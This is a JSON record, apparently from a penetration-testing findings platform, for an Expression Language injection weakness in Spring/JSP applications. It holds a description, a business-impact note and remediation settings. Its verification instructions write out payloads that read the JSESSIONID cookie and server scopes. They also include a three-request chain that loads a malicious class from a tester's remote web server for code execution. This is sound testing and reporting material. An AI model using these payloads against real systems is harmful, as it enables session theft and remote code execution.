{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":5051344,"exploitInstructions":"","verificationInstructions":"<b>Verification Instructions</b><br><br>EL injection works when server evaluates EL expressions server-side. To extract sample data showing that EL injection works:<br>Arithmetic operations (should result in 246 in server response): ${123+123}<br>Application scope in server response: ${applicationScope}<br>Request scope in server response: ${requestScope}<br>JSESSIONID cookie value in server response: ${cookie[\"JSESSIONID\"].value}<br>Arbitrary parameter value in server response: ${param.&lt;guessed param name&gt;}<br>Remote code execution (tested in Glassfish, failed with IBM Websphere/Web Logic)<br>1. Upload Malicous.class to PENTEST WEB SERVER<br>2. Execute following 3 requests in order:<br>${pageContext.request.getSession().setAttribute(\"arr\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}<br>${pageContext.request.getSession().getAttribute(\"arr\").add(pageContext.getServletContext().getResource(\"/\").toURI().create(\"http://&lt;PENTEST WEB SERVER&gt;/\").toURL())}<br>${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute(\"arr\").toArray(pageContext.getClass().getClassLoader().getParent).getURLs())).loadClass(\"Malicious\").newInstance()}<br><br><b>Reporting Requirements</b><br>Screenshot the initial page<br>Show initial HTTP request<br>Show modified HTTP request that contains the EL injection<br>If command execution is possible, add details of what could be done<br>If no command execution,  show that the EL injection is evaluated server-side<br><br><b>Further Testing</b><br>if outbound connectivity - Insufficient Egress Filtering<br>if code execution with elevated privileges - Excessive Privileges - Service Account<br><br><b>References</b><br>http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/<br>","remediationInstructions":"Avoid putting user data into an expression interpreter whenever possible. When it is necessary to do so, validate or encode the data to ensure it is not evaluated as expression language.<br><br>It is possible to disable this functionality in certain versions of the Spring framework. In Spring framework versions 3.1 and above it is disabled by default. For versions below 3.1 (3.0.6 onwards, 2.5.6.SEC03 onwards and 2.5.7.SR02 onwards), set the value of springJspExpressionSupport context parameter to false.<br><br><code>&lt;context-param&gt;<br>     &lt;description&gt;Spring Expression Language Support&lt;/description&gt;<br>     &lt;param-name&gt;springJspExpressionSupport&lt;/param-name&gt;<br>     &lt;param-value&gt;false&lt;/param-value&gt;<br>&lt;/context-param&gt;<br></code><br>","name":"EL Injection","sourceId":"WI:11310","severity":"High","businessImpact":"Successful exploitation of Expression Language injection could lead to information disclosure, bypass of HTTPOnly cookie access restriction, and remote code execution.","description":"Expression Language injection vulnerabilities were found within the application. Expression Language allows JSP pages to easily access application data stored in user-defined JavaBeans components as well as the implicit objects. In addition, JSP pages can also invoke arbitrary public and static methods and perform arithmetic operations using EL expressions. EL injection vulnerabilities are introduced when an application fails to validate untrusted user data before assigning it to attribute values of certain Spring MVC JSP tags. <br><br>By allowing attackers to inject EL expressions through insufficiently validated user input, an application could grant unauthorized access to sensitive application and server information. EL injection could also let attackers bypass HTTPOnly access restrictions imposed on cookies by exploiting access to the implicit cookie object made available in EL expressions.<br>"}}}